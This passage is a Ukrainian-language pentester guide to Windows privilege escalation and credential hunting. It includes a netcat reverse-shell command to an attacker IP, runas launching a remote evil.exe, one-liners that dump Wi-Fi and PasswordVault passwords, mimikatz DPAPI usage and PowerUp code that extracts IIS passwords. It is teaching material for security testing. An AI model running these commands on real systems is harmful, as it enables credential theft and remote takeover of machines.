Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```

### Таблиця ARP

```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```

### Правила брандмауера

[**Перегляньте цю сторінку зі related-командами для брандмауера**](../basic-cmd-for-pentesters.md#firewall) **(перегляд правил, створення правил, вимкнення, вимкнення...)**

Більше[ команд для переліку мережі тут](../basic-cmd-for-pentesters.md#network)

### Підсистема Windows для Linux (wsl)

```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```

Бінарний файл `bash.exe` також можна знайти в `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe`

Якщо ви отримали права користувача root, можна слухати на будь-якому порту (під час першої спроби використати `nc.exe` для прослуховування порту через GUI з’явиться запит, чи дозволити `nc` працювати через брандмауер).

```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```

Щоб легко запускати bash від імені root, можна спробувати `--default-user root`

Файлову систему `WSL` можна переглянути в папці `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\`

Сам по собі `root` у Linux усередині WSL не надає прав адміністратора Windows. Якщо поточний обліковий запис Windows може читати файлову систему дистрибутива, перевірте файли історії команд оболонки (зокрема `/root/.bash_history`) на наявність команд, у яких могли зберегтися облікові дані; для ескалації все одно потрібен дійсний обліковий запис із вищими привілеями та дозволений спосіб автентифікації. Структура `LocalState\rootfs` використовується в старіших інсталяціях WSL; у WSL 2 дистрибутив зазвичай зберігається на віртуальному диску [`ext4.vhdx`](https://learn.microsoft.com/en-us/windows/wsl/disk-space), тож спершу визначте фактичний дистрибутив і шлях до його сховища. Під час автоматизованого переліку уникайте виведення вмісту історії команд.

## Облікові дані Windows

### Облікові дані Winlogon

```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```

Treat `DefaultUserName` і `DefaultDomainName` як контекст облікового запису, а не облікові дані. Непорожнє значення `DefaultPassword` або `AltDefaultPassword` — це знахідка з відкритим паролем у реєстрі. Якщо `AutoAdminLogon=1`, але пароль у відкритому вигляді недоступний для читання, це лише зачіпка: [Sysinternals Autologon може зберігати пароль як секрет LSA](https://learn.microsoft.com/en-us/sysinternals/downloads/autologon), а звичайне читання реєстру не дає змоги встановити, чи існує цей секрет і чи можна його отримати. Перш ніж повідомляти про розкриття облікових даних, перевірте права доступу та фактичну конфігурацію входу.

### Менеджер облікових даних / Windows vault

З [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)<sup>[[34]](#references)</sup>\
Windows Vault зберігає облікові дані користувачів для серверів, вебсайтів та інших програм, які **Windows** може використовувати, щоб **автоматично входити в облікові записи користувачів**. Спочатку може здатися, що користувачі можуть зберігати облікові дані для таких сайтів, як Facebook, Twitter або Gmail, і автоматично входити через браузери, але це працює не так.

Windows Vault зберігає облікові дані, за допомогою яких Windows може автоматично входити в облікові записи користувачів. Це означає, що будь-яка **програма Windows, якій потрібні облікові дані для доступу до ресурсу** (сервера або вебсайту), **може використовувати цей Credential Manager** і Windows Vault та застосовувати надані облікові дані замість того, щоб користувачі щоразу вводили ім’я користувача й пароль.

Якщо програми не взаємодіють із Credential Manager, не думаю, що вони можуть використовувати облікові дані для певного ресурсу. Отже, якщо вашій програмі потрібно використовувати vault, вона має якось **зв’язатися з credential manager і запросити облікові дані для цього ресурсу** зі сховища за замовчуванням.

Використовуйте `cmdkey`, щоб переглянути збережені на комп’ютері облікові дані.

```bash
cmdkey /list
Currently stored credentials:
 Target: Domain:interactive=WORKGROUP\Administrator
 Type: Domain Password
 User: WORKGROUP\Administrator
```

Потім можна використовувати `runas` з опцією `/savecred`, щоб скористатися збереженими обліковими даними. У наведеному нижче прикладі викликається віддалений двійковий файл через SMB-ресурс.

```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```

Використання `runas` із наданими обліковими даними.

```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```

Зверніть увагу на mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html) або модуль [Empire Powershells](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1).

### UWP PasswordVault / Credential Locker

Сучасні програми Windows UWP, Microsoft Edge і сучасні системні служби зберігають токени автентифікації та паролі у відкритому вигляді в `PasswordVault` (Universal Windows Platform, UWP; також відображається як `Web Credentials` у `vaultcmd`). Це сховище ізольоване в межах сеансу, і його можна розшифрувати вбудованими засобами без прав адміністратора або `SeDebugPrivilege`.

Виконайте цю команду PowerShell в активному сеансі користувача, щоб миттєво вивести всі збережені імена користувачів і паролі у відкритому вигляді та розшифрувати їх:

```ps1
[void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]; $v = New-Object Windows.Security.Credentials.PasswordVault; $v.RetrieveAll() | ForEach-Object { try { $_.RetrievePassword(); $_ } catch {} } | Select-Object Resource, UserName, Password | Format-List
```

### DPAPI

**Data Protection API (DPAPI)** забезпечує метод симетричного шифрування даних і переважно використовується в операційній системі Windows для симетричного шифрування асиметричних приватних ключів. Для значного підвищення ентропії під час шифрування використовується секрет користувача або системи.

**DPAPI дає змогу шифрувати ключі за допомогою симетричного ключа, похідного від секретів для входу користувача**. У випадках системного шифрування використовуються секрети автентифікації системи в домені.

Зашифровані ключі RSA користувачів, зашифровані за допомогою DPAPI, зберігаються в каталозі `%APPDATA%\Microsoft\Protect\{SID}`, де `{SID}` — це [ідентифікатор безпеки](https://en.wikipedia.org/wiki/Security_Identifier) користувача. **Ключ DPAPI, розташований поруч із головним ключем, який захищає приватні ключі користувача в тому самому файлі**, зазвичай складається з 64 байтів випадкових даних. (Важливо зазначити, що доступ до цього каталогу обмежений, тому переглянути його вміст за допомогою команди `dir` у CMD не можна, але це можна зробити через PowerShell).

```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```

Можна скористатися **модулем mimikatz** `dpapi::masterkey` із відповідними аргументами (`/pvk` або `/rpc`), щоб розшифрувати його.

**Файли облікових даних, захищені головним паролем**, зазвичай розташовані в:

```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```

Ви можете скористатися **модулем mimikatz** `dpapi::cred` із відповідним `/masterkey` для розшифрування.\
Ви можете **витягти багато** **masterkeys DPAPI** з **пам’яті** за допомогою модуля `sekurlsa::dpapi` (якщо у вас є права root).


{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### Облікові дані PowerShell

**Облікові дані PowerShell** часто використовують для **скриптів** і завдань автоматизації, щоб зручно зберігати зашифровані облікові дані. Вони захищені за допомогою **DPAPI**, а це зазвичай означає, що їх може розшифрувати лише той самий користувач на тому самому комп’ютері, де їх було створено.

Експортований файл облікових даних може мати довільну назву або шлях із розширенням `.xml`. Якщо на такий файл вказує скрипт або інвентаризація файлів, визначте фактичний каталог профілю облікового запису, а не припускайте, що це `C:\Users`: [Windows може розміщувати профілі в інших місцях](https://learn.microsoft.com/en-us/windows/win32/shell/profiles-directory). Наявність файлу, який можна прочитати, — це лише зачіпка; [Windows `Export-Clixml` прив’язує зашифровані облікові дані до користувача й комп’ютера, які виконали експорт](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/export-clixml), а обліковий запис, дані якого вдалося відновити, має окремо мати дійсні права доступу до потрібної служби. Спершу перевірте шляхи й ACL, не виводячи зашифровані або відкриті значення під час звичайного переліку.

Щоб **розшифрувати** облікові дані PS із файлу, який їх містить, виконайте:

```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```

### Wi-Fi

```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```

### Збережені RDP-підключення

Їх можна знайти в `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers\`\
і в `HKCU\Software\Microsoft\Terminal Server Client\Servers\`

### Нещодавно виконані команди

```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```

### **Диспетчер облікових даних віддаленого робочого стола**

```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```

Використовуйте модуль **Mimikatz** `dpapi::rdg` із відповідним `/masterkey`, щоб **розшифрувати будь-які .rdg-файли**\
За допомогою модуля **Mimikatz** `sekurlsa::dpapi` можна **витягти з пам’яті багато DPAPI masterkey**

**mRemoteNG використовує інше сховище підключень.** Перевірте читабельні XML-файли в `%APPDATA%\mRemoteNG` і документах користувача, зокрема файли зі звичайними назвами, як-от `config.xml`. Перш ніж вважати XML-файл потенційним джерелом облікових даних, визначте схему підключень і зашифровані атрибути `Password`. Збережене значення — це не пароль DPAPI/RDCMan; можливість відновлення залежить від параметрів шифрування файлу та від того, чи використовувався власний master password. Під час широкого пошуку не виводьте зашифровані значення.

**Експорти профілів Remote Desktop Plus** також можуть бути читабельними й міститися в каталогах користувачів або спільній папці адміністрування. У застарілому експорті `profiles.xml` є записи `Data/Profile` з елементами `ProfileName`, `Password` і `Secure`. Вважайте непорожній елемент пароля потенційним джерелом облікових даних, але не виводьте його й не припускайте, що він відкритий: [зауважує постачальник](https://www.donkz.nl/), що захист профілю може бути прив’язаний до облікового запису та комп’ютера, на яких його створили, або налаштований менш суворо. Перш ніж покладатися на цей файл, підтвердьте його походження й умови відновлення.

### Sticky Notes

Люди часто використовують застосунок Sticky Notes на робочих станціях Windows, щоб **зберігати паролі** та іншу інформацію, не усвідомлюючи, що це файл бази даних. Цей файл розташований за адресою `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` і його завжди варто шукати й перевіряти.

Люди іноді зберігають паролі та іншу інформацію в застосунках для нотаток. Пакетний застосунок Microsoft Sticky Notes зазвичай зберігає нотатки в `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite`; старіші або інші застосунки можуть використовувати інші сховища в профілі користувача, зокрема LevelDB. Перш ніж вважати відсутність файлу SQLite доказом відсутності нотаток, визначте встановлений застосунок і формат сховища.

Якщо Sticky Notes використовує журналювання SQLite з випереджальним записом, окрема копія `plum.sqlite` може не містити нещодавно зафіксованих нотаток. Зберігайте відповідний `plum.sqlite-wal` разом із узгодженою копією бази даних і додайте `plum.sqlite-shm`, якщо він доступний; індекс спільної пам’яті можна перебудувати, але WAL є частиною постійного стану бази даних. Див. [документацію SQLite щодо WAL](https://www.sqlite.org/wal.html). Нотатка з іменем облікового запису або паролем — лише потенційне джерело облікових даних: окремо перевірте обліковий запис, дозволений доступ і повторне використання пароля. Для зашифрованого запису менеджера паролів також потрібні власне ключ розшифрування та специфічна для застосунку інтерпретація, перш ніж такий запис може підтвердити можливість входу з вищими привілеями.

### AppCmd.exe

**Зверніть увагу: щоб відновити паролі з AppCmd.exe, потрібно мати права адміністратора та запускати його з рівнем High Integrity.**\
**AppCmd.exe** розташований у каталозі `%systemroot%\system32\inetsrv\`.\
Якщо цей файл існує, можливо, було налаштовано й можна **відновити** певні **облікові дані**.

Цей код узято з [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1):

```bash
function Get-ApplicationHost {
    $OrigError = $ErrorActionPreference
    $ErrorActionPreference = "SilentlyContinue"

    # Check if appcmd.exe exists
    if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
        # Create data table to house results
        $DataTable = New-Object System.Data.DataTable

        # Create and name columns in the data table
        $Null = $DataTable.Columns.Add("user")
        $Null = $DataTable.Columns.Add("pass")
        $Null = $DataTable.Columns.Add("type")
        $Null = $DataTable.Columns.Add("vdir")
        $Null = $DataTable.Columns.Add("apppool")

        # Get list of application pools
        Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

            # Get application pool name
            $PoolName = $_

            # Get username
            $PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
            $PoolUser = Invoke-Expression $PoolUserCmd

            # Get password
            $PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
            $PoolPassword = Invoke-Expression $PoolPasswordCmd

            # Check if credentials exists
            if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
                # Add credentials to database
                $Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
            }
        }

        # Get list of virtual directories
        Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

            # Get Virtual Directory Name
            $VdirName = $_

            # Get username
            $VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
            $VdirUser = Invoke-Expression $VdirUserCmd

            # Get password
            $VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
            $VdirPassword = Invoke-Expression $VdirPasswordCmd

            # Check if credentials exists
            if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
                # Add credentials to database
                $Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
            }
        }

        # Check if any passwords were found
        if( $DataTable.rows.Count -gt 0 ) {
            # Display results in list view that can feed into the pipeline
            $DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
        }
        else {
            # Status user
            Write-Verbose 'No application pool or virtual directory passwords were found.'
            $False
        }
    }
    else {
        Write-Verbose 'Appcmd.exe does not exist in the default location.'
        $False
    }
    $ErrorActionPreference = $OrigError
}
```

### SCClient / SCCM

Перевірте, чи існує `C:\Windows\CCM\SCClient.exe` .\
Інсталятори **запускаються з привілеями SYSTEM**, багато з них вразливі до **DLL Sideloading (Інформація з** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).**

```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```

## Файли та реєстр (облікові дані)

### Артефакти облікових даних у реєстрі засобів підтримки

У деяких старіших інсталяціях засобів віддаленої підтримки під фіксованими ключами реєстру програм зберігаються назви значень, пов’язані з паролями. Наприклад, згідно з [поясненням виробника щодо ключа реєстру](https://community.teamviewer.com/English/discussion/82264/specification-on-cve-2019-18988), у версіях TeamViewer до 9 включно `SecurityPasswordAES` позначало налаштований статичний пароль сеансу. Маркер у назві значення — лише підказка для перевірки: перш ніж оцінювати ці облікові дані, перевірте встановлену версію, доступність даних значення для читання, формат і поточну поведінку автентифікації. Перехід від пароля засобу віддаленої підтримки до облікового запису Windows із вищими привілеями також потребує фактичного повторного використання пароля й наявності дозволу для цього облікового запису. Не виводьте шифротекст і відновлені паролі під час звичайного переліку.

### Спільні електронні таблиці із захищеними аркушами

Якщо є підозра, що доступна для читання спільна книга містить дані облікових записів, розрізняйте **шифрування файлу** та захист аркуша чи приховані стовпці. [Microsoft зазначає](https://support.microsoft.com/en-us/excel/protection-and-security-in-excel), що захист аркуша обмежує редагування і не є засобом безпеки; сам по собі він не означає, що вміст книги зашифровано. Перевіряйте лише дозволені й релевантні файли та не виводьте ймовірні секрети під час широкого переліку. Сам по собі доступний для читання шлях до `.xlsx`, захищений аркуш або прихований стовпець не доводить, що там є облікові дані чи що будь-який обліковий запис має вищі привілеї; окремо перевірте фактичні дані та поточні права облікового запису.

### Збережені патчі змін на CI-сервері

CI-сервер може зберігати надіслані зміни вихідного коду в каталозі даних навіть після завершення збірки. [TeamCity документує](https://www.jetbrains.com/help/teamcity/teamcity-data-directory.html) `system/changes` як сховище змін для віддалених запусків; каталог даних можна налаштувати, і він не обов’язково розташований у `ProgramData`. Доступний для читання патч може зберігати видалені або додані посилання на файл облікових даних, ключ шифрування чи скрипт, що використовує і те, й інше. Наприклад, для сценарію PowerShell `ConvertTo-SecureString -Key` потрібні і ключ AES, і зашифрований рядок; [Microsoft документує](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/convertfrom-securestring), що ключ передається окремо. Спершу перегляньте лише назви доступних патчів, а потім, маючи відповідний дозвіл, перевірте потрібний вміст, не виводячи секрети під час звичайного переліку. Шлях до патча, зашифроване значення чи посилання на ключ самі по собі не доводять наявності дійсних облікових даних або доступу з вищими привілеями. Обмежте ACL каталогу даних і не додавайте секрети до змін збірки.

### Саморобна ротація пароля локального адміністратора

Саморобний засіб ротації паролів може зберігати зашифрований пароль локального адміністратора в локальній службі, а облікові дані до сховища даних — у доступному для читання файлі `.env` або поруч із двійковим файлом засобу оновлення. Разом перевірте заплановане завдання засобу оновлення, обліковий запис, ACL конфігурації, слухач і дозволи сховища даних. До сховища даних, доступного лише через loopback, усе одно може підключитися локальний користувач із дійсними обліковими даними, але сама автентифікація не доводить наявності дозволу читати потрібні записи. Якщо поруч із шифротекстом доступне початкове значення шифрування або матеріал ключа, перш ніж покладатися на шифрування, перевірте точний спосіб виведення ключа. Схема, що детерміновано виводить ключ AES із відкритого початкового значення за допомогою Go [`math/rand`](https://pkg.go.dev/math/rand), не підходить для захисту цього пароля; у документації Go зазначено, що цей пакет не призначений для випадковості, чутливої до безпеки. Перш ніж вважати відновлений пароль шляхом підвищення привілеїв, переконайтеся, що він досі дійсний і належить обліковому запису з групи локальних адміністраторів. Саме лише заплановане завдання, шлях до `.env` або зашифрований блок нічого з цього не доводять. Не виводьте паролі й матеріал ключа під час звичайного переліку.

Для керованих паролів локальних адміністраторів використовуйте [Windows LAPS](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-concepts-overview). Сховище на основі каталогу чи Entra та засоби контролю доступу до нього відрізняються від саморобного локального сховища; так само [ролі Elasticsearch](https://www.elastic.co/guide/en/elasticsearch/reference/current/authorization.html/) визначають, чи може автентифікований користувач сховища даних читати певний індекс.

### Архіви плагінів Java-серверів і повторне використання облікових даних

Деякі плагіни Java-серверів постачаються як архіви JAR у каталозі `plugins` сервера. Доступний для читання власний плагін може містити конфігурацію або байткод із вбудованими обліковими даними служби. Перевіряйте архів лише за наявності дозволу й не виводьте відновлені секрети під час звичайного переліку. Сам по собі шлях до плагіна не доводить наявності секрету, а відновлений пароль служби веде до вищих привілеїв лише за умови, що він також дійсний для облікового запису з вищими привілеями. Перевірте відповідні ACL файлів і замініть повторно використані облікові дані на окремі секрети. Див. [посібник PaperMC зі встановлення плагінів](https://docs.papermc.io/paper/adding-plugins/) щодо структури каталогів і [документацію Oracle про JAR](https://docs.oracle.com/javase/8/docs/technotes/guides/jar/index.html) щодо вмісту архівів.

### Облікові дані вбудованої бази даних Openfire

Інсталяція Openfire із вбудованою базою даних може зберігати `openfire.script` у `Openfire\embedded-db`. Якщо поточний обліковий запис може прочитати цей файл, перевірте разом записи `OFUSER` і властивість `passwordKey`. У [документації Openfire про постачальника облікових записів](https://download.igniterealtime.org/openfire/docs/latest/documentation/javadoc/org/jivesoftware/openfire/user/DefaultUserProvider.html) зазначено, що паролі можуть зберігатися у відкритому вигляді або шифруватися ключем, указаним у цій властивості. Відновлений пароль важливий для підвищення привілеїв лише тоді, коли він досі дійсний для ідентифікатора з вищими привілеями; сама назва файлу не доводить ані наявності доступу для читання, ані повторного використання облікових даних. Цей шлях — лише підказка для інвентаризації, тому не виводьте вміст бази даних та облікові дані під час звичайного переліку.

Окремий файл `Openfire\conf\openfire.xml` може розкривати налаштовані порти й інтерфейс прив’язки консолі адміністратора, навіть якщо використовується зовнішня база даних. Openfire зазвичай прив’язує консоль адміністратора до loopback; за запущеного слухача локальний обліковий запис усе одно може звернутися до цієї адреси. Разом перевірте фактичний слухач, авторизовану роль адміністратора, політику завантаження плагінів та ідентифікатор служби Openfire. Адміністратор, який може встановити плагін, може спричинити виконання його коду в контексті служби; це може дати високі привілеї, якщо служба працює від імені LocalSystem. Відповідний пароль облікового запису чи доступний для читання шлях до конфігурації самі по собі не доводять доступу до консолі адміністратора або виконання коду. Див. [посібник виробника з інсталяції та керування плагінами](https://download.igniterealtime.org/openfire/docs/latest/documentation/install-guide.html) і [властивість API завантаження плагінів](https://download.igniterealtime.org/openfire/docs/latest/documentation/javadoc/org/jivesoftware/admin/servlet/PluginServlet.html).

### Конфігурація сервера керування цифровою криміналістикою

Конфігурації сервера Velociraptor, які зазвичай називаються `server.config.yaml`, можуть містити `CA.private_key` внутрішнього CA. Якщо користувач із нижчими привілеями може прочитати цей ключ, він може мати змогу створити сертифікат клієнта API. Чи дає це вищі привілеї, залежить від ролей користувачів на сервері, доступності API та ідентифікатора, від імені якого працює сервер або цільовий агент. Конфігурація клієнта містить інший матеріал; її виявлення не підтверджує доступу до CA сервера. У деяких розгортаннях закритий ключ CA зберігається офлайн, тому доступна для читання конфігурація сервера може не містити ключа підпису.

На сервері Windows перевірте ACL **конфігурації сервера** в каталозі інсталяції та будь-яких захищених резервних копіях. Одне з можливих розташувань — `%ProgramFiles%\VelociraptorServer\server.config.yaml`; якщо шлях, налаштований для служби, відрізняється, використовуйте його. Переконайтеся, що поточний ідентифікатор може прочитати файл і що `CA.private_key` справді наявний. Не виводьте закритий ключ у журнали чи результати переліку. Процедура виробника `config api_client` використовує ключ CA для видачі сертифіката клієнта, але також потрібна відповідна роль на сервері; її створення або зміна може вимагати дозволу на запис у сховище даних або перезапуску. Уже наявний привілейований ідентифікатор сервера може надати шлях, навіть якщо запис недоступний. Запити API з правами на виконання запускаються в контексті відповідного сервера або агента, який може мати високі привілеї.

Захищайте конфігурацію сервера та резервні копії обмежувальними ACL, за можливості зберігайте ключ підпису CA офлайн і обмежуйте ролі API та доступ до слухача. Див. [документацію Velociraptor API](https://docs.velociraptor.app/docs/server_automation/server_api/) і [рекомендації з налаштування безпеки](https://docs.velociraptor.app/docs/deployment/security/).

### Облікові дані PuTTY

```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```

Solar-PuTTY — це окремий менеджер сеансів. Його власне зашифроване сховище може міститися за адресою `%APPDATA%\SolarWinds\FreeTools\Solar-PuTTY\data.dat`, тоді як експортована резервна копія сеансів може мати назву `sessions-backup.dat` і зберігатися в іншому місці. У [посібнику SolarWinds з експорту](https://thwack.solarwinds.com/discussion/comment/115591) зазначено, що експорти зашифровані паролем і можуть містити сеанси, ключі, скрипти, теги та зв’язки між ними; у [форумі підтримки](https://thwack.solarwinds.com/discussion/4520/saved-session-lost) вказано розташування власного сховища. Спершу перевірте дозволи на файли та шляхи. Виявлення будь-якого з цих файлів не розкриває пароль і не доводить, що збережені облікові дані досі дійсні або надають вищі привілеї.

### Ключі SSH-хостів PuTTY

```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```

### SSH-ключі в реєстрі

Приватні SSH-ключі можуть зберігатися в реєстровому ключі `HKCU\Software\OpenSSH\Agent\Keys`, тож перевірте, чи є там щось цікаве:

```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```

Якщо в цьому шляху ви знайдете будь-який запис, імовірно, це збережений SSH-ключ. Він зберігається в зашифрованому вигляді, але його можна легко розшифрувати за допомогою [https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract).\
Більше інформації про цю техніку: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)<sup>[[37]](#references)</sup>

Якщо служба `ssh-agent` не запущена й ви хочете, щоб вона запускалася автоматично під час завантаження системи, виконайте:

```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```

> [!TIP]
> Схоже, ця техніка більше не працює. Я спробував створити кілька ssh-ключів, додати їх за допомогою `ssh-add` і ввійти на машину через ssh. Розділ реєстру HKCU\Software\OpenSSH\Agent\Keys не існує, а procmon не виявив використання `dpapi.dll` під час автентифікації за допомогою асиметричного ключа.

### Файли автоматичної інсталяції

```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```

Також можна шукати ці файли за допомогою **metasploit**: _post/windows/gather/enum_unattend_

Приклад вмісту:

```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
    <AutoLogon>
     <Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
     <Enabled>true</Enabled>
     <Username>Administrateur</Username>
    </AutoLogon>

    <UserAccounts>
     <LocalAccounts>
      <LocalAccount wcm:action="add">
       <Password>*SENSITIVE*DATA*DELETED*</Password>
       <Group>administrators;users</Group>
       <Name>Administrateur</Name>
      </LocalAccount>
     </LocalAccounts>
    </UserAccounts>
```

### Резервні копії SAM і SYSTEM

```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```

Доступні для читання файли резервних копій Windows Imaging (`.wim`) також можуть містити офлайн-кущі `SAM`, `SECURITY` і `SYSTEM`. Насамперед перевіряйте локально доступні каталоги резервних копій або образів і перед розпакуванням переглядайте **імена файлів в образі**; сама назва файлу `.wim` не доводить, що в ньому є кущі реєстру, а стандартні `install.wim`, `boot.wim` і образи відновлення часто виявляються хибними зачіпками. Спільний ресурс SMB — це окремий шлях доступу; перевіряйте його, лише якщо він входить до сфери перевірки. Див. рекомендації Microsoft щодо [образів Windows](https://learn.microsoft.com/en-us/windows-hardware/manufacture/desktop/work-with-windows-images) і [довідник із файлів кущів реєстру](https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-hives).

### Хмарні облікові дані

```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```

### McAfee SiteList.xml

Знайдіть файл із назвою **SiteList.xml**

### Кешований пароль GPP

Раніше була доступна функція, яка дозволяла розгортати власні облікові записи локального адміністратора на групі комп’ютерів через Group Policy Preferences (GPP). Однак цей метод мав серйозні недоліки безпеки. По-перше, об’єкти групової політики (GPO), що зберігалися як XML-файли в SYSVOL, були доступні будь-якому користувачу домену. По-друге, паролі в цих GPP, зашифровані за допомогою AES256 із загальнодоступним задокументованим ключем за замовчуванням, міг розшифрувати будь-який автентифікований користувач. Це становило серйозну загрозу, оскільки могло дозволити користувачам отримати підвищені привілеї.

Щоб зменшити цей ризик, було розроблено функцію для пошуку локально кешованих файлів GPP, що містять непорожнє поле "cpassword". Знайшовши такий файл, функція розшифровує пароль і повертає власний об’єкт PowerShell. Цей об’єкт містить відомості про GPP і розташування файлу, що допомагає виявити й усунути цю вразливість безпеки.

